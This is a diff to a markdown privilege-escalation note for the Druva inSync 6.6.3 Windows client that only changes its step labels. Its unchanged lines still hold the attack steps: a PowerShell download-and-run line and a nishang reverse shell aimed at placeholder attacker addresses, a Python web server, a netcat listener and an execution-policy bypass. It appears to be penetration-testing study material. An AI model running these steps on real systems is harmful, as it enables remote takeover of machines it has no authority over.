@@ -12,7 +12,7 @@ links: Privesc
 
 **Druva inSync Windows Client Local Privilege Escalation Example**
 
-1. **TARGET**: Verify vulnerable Druva inSync version
+1. **Target**: Verify vulnerable Druva inSync version
 
 ```sh
 wmic product get name
@@ -22,7 +22,7 @@ wmic product get name
 Druva inSync 6.6.3
 ```
 
-1. **TARGET**: Modify the POC (*`Druva.ps1`*)
+1. **Target**: Modify the POC (*`Druva.ps1`*)
 
 <!-- Example {{{-->
 > [!example]- POC
@@ -71,7 +71,7 @@ $cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://<attacke
 > ```
 <!-- }}} -->
 
-2. **ATTACKER**: Modify [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)
+2. **Attacker**: Modify [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)
 
 Append a reverse shell to the end of the script
 
@@ -79,25 +79,25 @@ Append a reverse shell to the end of the script
 Invoke-PowerShellTcp -Reverse -IPAddress <attacker_ip> -Port <attacker_port>
 ```
 
-3. **ATTACKER**: Start a Python web server and serve [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)
+3. **Attacker**: Start a Python web server and serve [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)
 
 ```sh
 python3 -m http.server 8080
 ```
 
-4. **ATTACKER**: Start a [[Netcat]] listener
+4. **Attacker**: Start a [[Netcat]] listener
 
 ```sh
 nc -lvnp 1234
 ```
 
-5. **TARGET**: [Modify PowerShell execution policy](https://www.netspi.com/blog/technical-blog/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/)
+5. **Target**: [Modify PowerShell execution policy](https://www.netspi.com/blog/technical-blog/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/)
 
 ```powershell
 Set-ExecutionPolicy Bypass -Scope Process
 ```
 
-6. **TARGET**: Launch the POC (*`Druva.ps1`*)
+6. **Taregt**: Launch the POC (*`Druva.ps1`*)
 
 ```sh
 .\Druva.ps1
